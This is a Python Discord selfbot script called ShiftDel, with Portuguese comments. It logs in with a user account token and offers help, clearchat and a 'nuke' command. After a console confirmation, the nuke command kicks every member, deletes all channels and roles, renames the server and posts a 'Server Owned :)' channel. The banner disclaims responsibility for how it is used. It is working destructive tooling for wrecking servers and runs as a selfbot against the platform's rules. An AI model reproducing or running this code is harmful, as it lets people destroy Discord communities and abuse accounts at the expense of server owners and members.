print("[?] Token; ")
token = input ('> ')
print("  ")
print("[?] Prefix; ")
prefix = input ('> ')

import discord
import colorama
from colorama import Fore as Color
from colorama import Style
import requests
import os
import datetime
import inputimeout
from inputimeout import inputimeout, TimeoutOccurred
os.system('cls')
print("...")
class MyClient(discord.Client):
  async def on_connect(self):
    os.system('cls')
    print(f"""

  ███████╗██╗  ██╗██╗███████╗████████╗██████╗ ███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║     
  ███████╗███████║██║█████╗     ██║   ██║  ██║█████╗  ██║     
  ╚════██║██╔══██║██║██╔══╝     ██║   ██║  ██║██╔══╝  ██║     
  ███████║██║  ██║██║██║        ██║   ██████╔╝███████╗███████╗
  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚═════╝ ╚══════╝╚══════╝

    Youtube: Constzada | Discord:Caua#0001

[!] Successfully logged in!
[!] I am not responsible for your Acts.
[-] If It Is To Record Put Credits in the Description!
[/] {prefix}help""")

# Reg.comandos
  async def on_message(self, message):
    if message.author != client.user:
      return
    if message.content == f"{prefix}help":
      await help(message)
    if message.content == f"{prefix}clearchat":
      await channelclear(message)
    if message.content == f"{prefix}nuke":
      await nuke(message)

# log cliente
async def logout(message):
  await message.delete()
  await client.logout()
  print(f"\n Cliente Logado com Sucesso!")

# comando de help
async def help(message):
  await message.delete()
  emHelp = discord.Embed(
    description = f"""
**Commands:**
**
[-] {prefix}help
Mostrar está mensagem.
 
[-]{prefix}clearchat
Limpa suas mensagens no canal.
 
[-]{prefix}nuke*
Destruir o servidor, Será solicitada sua confirmação no console.
**
    """)
  emHelp.set_author(name = "ShiftDel", icon_url = client.user.avatar_url, url = "")
  emHelp.set_footer(text = "ShiftDel ")
  try:
    await message.channel.send(embed = emHelp, delete_after = 30)
  except:
    await message.channel.send(
      """
**Commands:**
**
[-] {prefix}help
Mostrar está mensagem.
 
[-]{prefix}clearchat
Limpa suas mensagens no canal.
 
[-]{prefix}nuke*
Destruir o servidor, Será solicitada sua confirmação no console.
**
""",
     delete_after = 30
    )

# config dos comandos
async def servernuke(ctx):
    for user in ctx.guild.members:
        try:
            await user.kick()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="ShiftDel-Selfbot",
            description="ShiftDel-Selfbot",
            reason="ShiftDel-Selfbot",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(1):
        await ctx.guild.create_text_channel(name="Server Owned :)")
    for _i in range(1):
        await ctx.guild.create_role(name="ShiftDel Selfbot",)


async def nuke(message):
  await message.delete()
  if isinstance(message.channel, discord.DMChannel):
    print(f"Nuke Cancelado!\n")
    return
  elif isinstance(message.channel, discord.GroupChannel):
    print(f"Nuke Cancelado!\n")
    return
  try:
    confirmation = inputimeout(f"\n[?] Pedido de Nuke, (y/n) \n \n>", timeout = 30)
    if confirmation.lower() == "n":
      print(f"\n Nuke off\n")
      return
    elif confirmation.lower() == "y":
      print(f"\n Nuking...\n")
      member = message.guild.get_member(client.user.id)
      perms = member.guild_permissions
      if perms.manage_channels == True and perms.ban_members == True:
        await servernuke(message)
      else:
        print(f"\n[!] Tarefa Concluida!\n")
        return
    else:
      print(f"\nNuke Cancelado!")
  except TimeoutOccurred:
    print(f"\nNuke cancelled.\n")
    return

async def channelclear(message):
  await message.delete()
  print(f"[{datetime.datetime.now()} UTC]\nDeletando Mensagens do Privado...")
  async for message in message.channel.history(limit=None):
    if message.author == client.user and message.type == discord.MessageType.default:
      await message.delete()
  print(f"[!] Tarefa Concluida!\n")


client = MyClient()
try:
  client.run(token, bot = False)
except discord.LoginFailure:
  print(f"Client failed to log in. [Invalid token]")
except discord.HTTPException:
  print(f"Client failed to log in.[Unknown Error]")

